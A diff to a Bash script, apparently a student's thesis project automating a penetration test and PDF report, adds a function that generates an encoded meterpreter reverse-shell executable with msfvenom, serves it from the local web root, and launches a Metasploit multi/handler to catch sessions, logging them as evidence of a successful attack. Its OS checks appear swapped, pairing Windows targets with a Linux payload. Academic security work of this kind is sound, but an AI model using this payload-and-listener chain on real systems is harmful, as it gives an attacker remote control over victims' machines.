@@ -120,7 +120,7 @@ _mostrarResultado()
         echo "Ejecución de metasploit"
         echo "------------------------------------"
         echo ""
-        _metasploit $dom & bash spinner.sh $!
+        _metasploit $dom #& bash spinner.sh $!
       fi
     fi
 
@@ -397,6 +397,65 @@ END_SQL
   fi
 }
 
+_metasploit(){
+  ip=$(ifconfig eth0 | grep "inet " | awk '{print $2}') 
+  port=22
+  if grep -q "Windows" /home/david/TFM/Reporte/nmap.txt; 
+  then
+    payload=linux/x64/meterpreter/reverse_tcp
+    name=mtp_linux
+    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o /home/david/TFM/$name.exe 2>/dev/null
+  elif grep -q "Linux" /home/david/TFM/Reporte/nmap.txt;
+  then
+    payload=windows/meterpreter/reverse_tcp
+    name=mtp_windows
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o /home/david/TFM/$name.exe 2>/dev/null
+  fi
+  
+  file=$(ls /home/david/TFM/$name.exe)
+
+  echo "Payload generado "
+  echo "Ejecutable creado:" $file
+
+  echo "Copiando payload a /var/www/html "
+  sudo cp $name.exe /var/www/html/
+  echo "Copiado "
+  echo "Url :"" ""http://"$ip"/"$name".exe"
+  echo "use exploit/multi/handler
+  set PAYLOAD" ""$payload"
+  set LHOST" ""$ip"
+  set LPORT" ""$port"
+  set ExitOnSession false
+  exploit -j -z
+  sleep 5
+  sessions
+  exit -y" | tee listenerw.rc
+
+  echo "Arrancamos MetasploitFramework multi/handler" 
+  msfconsole -q -r listenerw.rc > /home/david/TFM/Reporte/msf.txt
+
+  #sed -e 's/\x1b\[[0-9;]*m//g' /home/david/TFM/Reporte/msf.txt > /home/david/TFM/Reporte/msf2.txt
+  #mv /home/david/TFM/Reporte/msf2.txt /home/david/TFM/Reporte/msf.txt
+  sed -i 's/\x1b\[[0-9;]*m//g' /home/david/TFM/Reporte/msf.txt
+  sed -i 's/\\/\//g' /home/david/TFM/Reporte/msf.txt
+
+
+  filebreak=$(sed -n '/^Active/{=;q;}' /home/david/TFM/Reporte/msf.txt)
+  filebreak=$((filebreak-1))
+
+  split -l $filebreak /home/david/TFM/Reporte/msf.txt segment
+
+  sed -i '/^\[/!d' /home/david/TFM/Reporte/segmentaa
+  sed -i 's/$/  /' /home/david/TFM/Reporte/segmentaa
+  echo '\n' >> /home/david/TFM/Reporte/segmentaa
+  sed -i 's/([^()]*)//g' /home/david/TFM/Reporte/segmentab
+  sed -i 's/\=/\-/g' /home/david/TFM/Reporte/segmentab
+
+  cat /home/david/TFM/Reporte/segmentaa /home/david/TFM/Reporte/segmentab > /home/david/TFM/Reporte/msf.txt
+
+  rm /home/david/TFM/Reporte/segmenta*
+}
+
 _report(){
   domain=$1
   _repPortada $domain
@@ -404,8 +463,11 @@ _report(){
 
   _repMetagoofil
   _repHarvester
-
   _repNMAP
+  _repMetasploit
+
+  _repAutorizacion
+  #_repConfidencialidad
 
   pandoc /home/david/TFM/Reporte/Reporte.md -o /home/david/TFM/Reporte/Reporte.pdf
 }
@@ -466,9 +528,10 @@ echo "title: Informe sobre el dominio "$domain >> /home/david/TFM/Reporte/Report
 echo "author: David Hervás Rodríguez" >> /home/david/TFM/Reporte/Reporte.md
 echo "date: "$fechaRep >> /home/david/TFM/Reporte/Reporte.md
 echo "header-includes:" >> /home/david/TFM/Reporte/Reporte.md
-echo "  - \usepackage{multirow, xltabular}" >> /home/david/TFM/Reporte/Reporte.md
+echo "  - \usepackage{multirow, xltabular, geometry}" >> /home/david/TFM/Reporte/Reporte.md
 echo "output:" >> /home/david/TFM/Reporte/Reporte.md
 echo "    pdf_document" >> /home/david/TFM/Reporte/Reporte.md
+echo "geometry: margin=2cm" >> /home/david/TFM/Reporte/Reporte.md
 echo "---" >> /home/david/TFM/Reporte/Reporte.md
 echo "![](/home/david/TFM/temp/LogoUNED.jpg)" >> /home/david/TFM/Reporte/Reporte.md
 printf '%s' '\newpage' >> /home/david/TFM/Reporte/Reporte.md
@@ -741,8 +804,36 @@ _repNMAP(){
     printf '%s' '\end{xltabular}' >> /home/david/TFM/Reporte/Reporte.md
 
   fi
+  #printf '%s' '\newpage' >> /home/david/TFM/Reporte/Reporte.md
+}
+
+_repMetasploit(){
+  if [ -f /home/david/TFM/Reporte/msf.txt ]; then
+    echo "\n\n# Etapa 3: Explotación - Metasploit" >> /home/david/TFM/Reporte/Reporte.md
+    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> /home/david/TFM/Reporte/Reporte.md
+
+    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Evidencia de ataque exitoso}} \\ \hline' >> /home/david/TFM/Reporte/Reporte.md 
+    printf '%s' '\endfirsthead' >> /home/david/TFM/Reporte/Reporte.md
+
+    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Evidencia de ataque exitoso}} \\ \hline' >> /home/david/TFM/Reporte/Reporte.md 
+    printf '%s' '\endhead' >> /home/david/TFM/Reporte/Reporte.md
+
+    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> /home/david/TFM/Reporte/Reporte.md
+    printf '%s' '\endfoot' >> /home/david/TFM/Reporte/Reporte.md
+
+    printf '%s' '\hline' >> /home/david/TFM/Reporte/Reporte.md
+    printf '%s' '\endlastfoot' >> /home/david/TFM/Reporte/Reporte.md
+
+    printf '%s' '\end{xltabular}' >> /home/david/TFM/Reporte/Reporte.md
+    cat /home/david/TFM/Reporte/msf.txt >> /home/david/TFM/Reporte/Reporte.md
+    printf '%s' '\newpage' >> /home/david/TFM/Reporte/Reporte.md
+  fi
 
 }
+
+_repAutorizacion(){}
+
+_repConfidencialidad(){}
 
 _initBDD()
 {
